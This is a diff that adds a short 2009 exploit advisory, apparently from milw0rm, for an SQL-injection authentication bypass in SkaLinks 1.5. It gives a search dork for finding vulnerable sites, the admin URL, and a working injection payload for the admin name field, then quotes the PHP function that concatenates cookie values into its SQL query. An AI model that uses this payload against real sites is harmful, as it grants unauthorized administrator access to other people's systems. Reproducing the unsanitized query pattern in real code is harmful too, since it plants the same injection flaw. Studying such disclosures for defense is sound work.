@@ -1,0 +1,34 @@
+########################################
+#                                      #
+# Product : SkaLinks                   #
+# Version : 1.5                        #
+# Dork : Powered by SkaLinks           #
+# Site: http://www.skalinks.com/       #
+# Founded by: Dimi4                    #
+# Date : 29.01.09                      #
+# Greetz: antichat                     #
+#                                      #
+########################################
+
+SQL-injection, Auth Bypass
+[+] URL: http://target.com/skalinks_1_5/admin/
+[+] Admin name : 1' OR 1=1/*
+
+Bug Function:
+
+ function IsAdmin( )
+    {
+        $table_name = $this->m_AdminsTable;
+        $res = $this->db_Row( "SELECT * FROM `$table_name` WHERE `Name`='".$_COOKIE['adminname']."' AND `Password`='".$_COOKIE['pwd']."'");
+        if ( !$res )
+        {
+            return 0;
+        }
+        else
+        {
+            return $res;
+        }
+    }
+(c) Dimi4, 2009 greetz to antichat
+
+# milw0rm.com [2009-01-30]
